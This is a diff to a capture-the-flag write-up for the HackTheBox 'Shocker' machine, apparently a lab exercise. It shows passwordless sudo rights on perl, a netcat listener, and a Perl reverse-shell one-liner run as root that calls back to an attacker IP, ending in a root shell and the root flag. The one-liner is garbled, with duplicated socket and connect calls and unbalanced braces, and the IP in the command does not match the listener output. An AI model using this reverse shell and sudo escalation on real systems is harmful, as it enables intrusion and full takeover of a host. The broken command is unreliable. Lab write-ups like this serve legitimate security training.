@@ -152,36 +152,43 @@
     cat user.txt
     631d652c................
 
-// 
+### ----Privilleges Escalation----
 
+// Lets check what have sudo permissions
 
-
-sudo -l
-Matching Defaults entries for shelly on Shocker:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User shelly may run the following commands on Shocker:
-    (root) NOPASSWD: /usr/bin/perl
+    $ sudo -l
     
-    
-// we can see that shelly able to run perl script with high privilleges(sudo)
+    Matching Defaults entries for shelly on Shocker:
+        env_reset, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User shelly may run the following commands on Shocker:
+        (root) NOPASSWD: /usr/bin/perl
+      
+// We can see that shelly able to run perl script with high privilleges(sudo)
+
 // all that last to do is make perl reverse shell
 
-$ rlwrap nc -lvnp 9002
+// First open a listiner
 
+    $ rlwrap nc -lvnp 9002
 
-shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'use Socket;$i="10.10.16.238";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+// We can found a perl shell script [here](https://www.revshells.com/)
 
+![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Shocker/3.png)
 
-$ rlwrap nc -lvnp 9002
-listening on [any] 9002 ...
-connect to [10.10.16.238] from (UNKNOWN) [10.10.10.56] 41516
-/bin/sh: 0: can't access tty; job control turned off
-whoami
-root
+    shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'use Socket;$i="10.10.17.8";$p=9002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
+// We got root shell !!
 
+    $ rlwrap nc -lvnp 9002
+    listening on [any] 9002 ...
+    connect to [10.10.16.238] from (UNKNOWN) [10.10.10.56] 41516
+    /bin/sh: 0: can't access tty; job control turned off
+    $ whoami
+    root
 
-cat root.txt
-309790985d406933fb96f8ed99cfcaac
+// And root flag !
+
+    cat root.txt
+    309790.................
